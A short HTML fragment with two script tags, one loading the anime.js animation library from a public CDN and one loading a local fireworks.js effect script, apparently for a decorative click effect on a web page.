    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
